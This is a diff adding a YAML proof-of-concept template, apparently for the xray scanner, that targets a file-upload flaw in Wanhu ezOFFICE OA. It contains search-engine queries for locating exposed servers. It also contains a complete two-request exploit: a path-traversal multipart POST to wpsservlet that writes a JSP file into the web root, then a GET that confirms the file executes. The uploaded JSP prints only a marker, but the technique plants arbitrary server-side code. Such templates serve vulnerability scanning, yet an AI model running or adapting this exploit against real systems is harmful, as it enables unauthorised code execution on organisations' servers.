@@ -1,0 +1,46 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: /defaultroot/platform/portal/layout/4ndex.jsp | 绝对路径   D:/jboss/jboss-as/server/oa/./deploy/defaultroot.war/platform/portal/layout/4ndex.jsp
+    
+name: poc-yaml-wanhu-ezoffice-wpsservlet-upload
+manual: true
+transport: http
+set:
+    s1: randomInt(10000000, 90000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /defaultroot/wpsservlet?option=saveNewFile&newdocId=4ndex&dir=../platform/portal/layout/&fileType=.jsp
+            headers:
+                Accept-Encoding: gzip, deflate
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{s2}}
+            body: "------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"NewFile\"; filename=\"4ndex.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.println(\"4ra1n\");%>\r\n------WebKitFormBoundary{{s2}}--"            
+        expression: response.status == 200 &&  response.raw_header.bcontains(b"defaultroot")
+
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /defaultroot/platform/portal/layout/4ndex.jsp
+            headers:
+            body:
+        expression: response.status == 200 && response.body_string.contains("4ra1n")
+
+expression: r0() && r1() 
